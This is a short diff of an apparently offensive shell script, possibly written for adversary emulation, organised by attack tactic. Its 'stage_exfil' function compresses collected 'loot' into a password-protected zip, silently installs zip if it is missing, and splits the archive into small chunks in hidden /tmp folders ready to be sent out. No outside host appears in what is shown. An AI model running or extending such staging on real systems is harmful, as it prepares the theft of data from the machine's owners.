@@ -54,12 +54,17 @@ function discovery() {
 ############################################
 function stage_exfil() {
 echo -e "Compress and encrypt all collected data for exfil "
-zip --password "Hope" /tmp/.staging/loot.zip /tmp/.staging/* > /dev/null 2>&1
+Z1="zip --password "Hope" /tmp/.staging/loot.zip /tmp/.staging/* > /dev/null 2>&1"
+if [ ! -x "$(command -v zip)" ]; then apt install zip -y > /dev/null 2>&1; $Z1; else $Z1; fi;
+
 
 echo -e "Prepare Exfil data - Split file into small chucks (23byte) before Exfil "
 split -a 15 -b 55 "/tmp/.staging/loot.zip" "/tmp/.exfil/loot.zip.part-"
 
 }
+
+
+
 
 ############################################
 # Tactic: Defense Evasion
